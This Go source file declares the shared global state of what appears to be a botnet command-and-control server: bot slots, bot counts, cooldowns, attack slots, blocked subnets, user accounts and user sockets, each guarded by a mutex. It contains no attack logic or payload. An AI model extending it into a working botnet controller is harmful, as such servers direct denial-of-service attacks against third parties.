package state

import (
	"cnc/internal/models"
	"net"
	"sync"
)

var (
	Bots               [models.MAX_BOTS]models.Bot
	BotCount           int
	GlobalCooldown     int
	CurrentGlobalSlots int
	BotMutex           sync.Mutex
	CooldownMutex      sync.Mutex
	BlockedSubnets     []*net.IPNet
	Password           string
)

var (
	Users      [models.MAX_USERS]models.User
	UserCount  int
	UsersMutex sync.Mutex
)

var (
	UserSockets      [models.MAX_USERS]net.Conn
	UserSocketsMutex sync.Mutex
)
